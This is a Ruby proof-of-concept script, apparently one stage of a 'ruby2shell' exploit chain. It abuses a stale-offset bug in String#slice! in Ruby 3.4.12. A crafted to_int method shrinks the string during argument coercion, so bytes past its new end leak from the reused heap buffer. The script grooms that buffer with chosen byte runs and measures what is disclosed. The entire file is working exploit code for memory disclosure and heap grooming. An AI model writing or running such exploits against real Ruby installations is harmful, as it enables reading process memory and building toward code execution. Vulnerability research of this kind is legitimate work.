# W336: groom the bytes disclosed by the W335 stale rb_str_slice_bang bound.
#
# 3.4.12 string.c:6015 searches the receiver, :6019 coerces argv[1] with a
# Ruby to_int, then :6023-6024 reads the stale register offsets and :6066
# copies len bytes unchecked from RSTRING_PTR(str)+beg. Replacing the receiver
# with a one-byte string reuses its heap buffer: the bytes past the new logical
# end are still in that buffer and can be chosen before the call. 3.4.13
# :6065-6067 clamps len to the post-coercion receiver length.
#
# Local script execution only: no wire, no monkey patch, no debugger write.
# Usage: ruby ruby2shell-slice-bang-groom.rb
# Env: W336_ARM=bands|uniform|nocoerce
#      W336_A=<first chosen run>  W336_B=<second chosen run>  W336_SHRINK=<bytes>
arm    = ENV.fetch("W336_ARM", "bands")
a_len  = Integer(ENV.fetch("W336_A", "256"))
b_len  = Integer(ENV.fetch("W336_B", "286"))
shrink = Integer(ENV.fetch("W336_SHRINK", "1"))

case arm
when "bands", "nocoerce"
  $s = ("Z" + ("Q" * a_len) + ("R" * b_len)).b
when "uniform"
  $s = ("Z" + ("q" * (a_len + b_len))).b
else
  abort "unknown W336_ARM #{arm}"
end

idx = if arm == "nocoerce"
        1
      else
        o = Object.new
        o.define_singleton_method(:to_int) do
          $s.replace("Z" * shrink)
          1
        end
        o
      end

begin
  out = $s.slice!(/(.+)/m, idx)
  bytes = out ? out.bytes : []
  q = bytes.each_index.select { |i| bytes[i] == (arm == "uniform" ? 0x71 : 0x51) }
  r = bytes.each_index.select { |i| bytes[i] == 0x52 }
  printf("RESULT arm=%s a=%d b=%d shrink=%d rlen=%d slen=%d " \
         "head=%s tail=%s qcount=%d qfirst=%d qlast=%d rcount=%d rfirst=%d rlast=%d\n",
         arm, a_len, b_len, shrink, bytes.length, $s.bytesize,
         bytes.first(8).map { |x| "%02x" % x }.join,
         bytes.last(8).map { |x| "%02x" % x }.join,
         q.length, q.first || -1, q.last || -1,
         r.length, r.first || -1, r.last || -1)
rescue => e
  printf("RESULT arm=%s a=%d b=%d shrink=%d raised=%s: %s\n",
         arm, a_len, b_len, shrink, e.class, e.message)
end
